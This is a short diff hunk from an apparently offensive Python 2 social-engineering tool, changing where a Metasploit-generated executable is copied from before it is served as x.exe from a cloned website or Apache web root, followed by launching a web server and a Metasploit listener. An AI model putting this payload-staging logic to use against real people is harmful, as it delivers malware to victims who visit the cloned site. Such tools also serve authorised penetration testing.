@@ -118,12 +118,12 @@ pause = raw_input("Press {return} to continue.")
 
 if payload_counter == 1:
         if apache == 0:
-                subprocess.Popen("mkdir src/program_junk/web_clone/;cp src/html/msf.exe src/program_junk/web_clone/x.exe 1> /dev/null 2> /dev/null", shell=True).wait()
+                subprocess.Popen("mkdir src/program_junk/web_clone/;cp src/program_junk/msf.exe src/program_junk/web_clone/x.exe 1> /dev/null 2> /dev/null", shell=True).wait()
                 if operating_system != "windows":
                         child=pexpect.spawn("python src/html/web_server.py")
                 
         if apache == 1:
-                subprocess.Popen("cp src/html/msf.exe %s/x.exe" % (apache_path), shell=True).wait()
+                subprocess.Popen("cp src/program_junk/msf.exe %s/x.exe" % (apache_path), shell=True).wait()
         if os.path.isfile("src/program_junk/meta_config"):
                 print bcolors.BLUE + "\n[*] Launching MSF Listener..."
                 print bcolors.BLUE + "[*] This may take a few to load MSF..." + bcolors.ENDC
